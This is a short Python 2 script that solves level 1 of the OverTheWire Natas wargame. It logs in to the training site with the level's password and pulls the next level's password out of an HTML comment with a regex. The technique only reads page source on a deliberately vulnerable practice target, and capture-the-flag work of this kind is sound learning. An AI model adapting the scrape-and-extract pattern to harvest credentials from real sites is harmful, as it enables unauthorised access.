#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level1pass):
    print "{+} Natas Level 1. Doing magic..."
    try:
        r = requests.get(url="http://natas1.natas.labs.overthewire.org", auth=HTTPBasicAuth('natas1', level1pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("for natas2 is (.*?) -->", r.text)
    if len(password):
        return password[0]
    return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level1password" %(args[0]))
    level2pass = exploit(args[1])
    if level2pass != None:
        print "{$$} Level 2 Password is: %s" %(level2pass)

if __name__ == "__main__":
    main(args=sys.argv)
